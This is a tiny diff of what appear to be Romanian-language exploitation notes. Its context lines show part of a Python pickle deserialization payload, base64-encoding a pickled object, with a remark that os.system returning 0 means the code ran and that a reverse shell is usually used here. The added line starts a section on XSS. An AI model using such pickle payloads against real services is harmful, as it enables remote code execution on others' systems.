@@ -20,3 +20,5 @@ class Blah(object):
 h=Blah()
 base64.b64encode(cPickle.dumps(h))
 ----- os.system va returna 0 ceea ce inseamna ca se executa ( de fel folosesti un reverse shell pt asta)
+
+5. xss
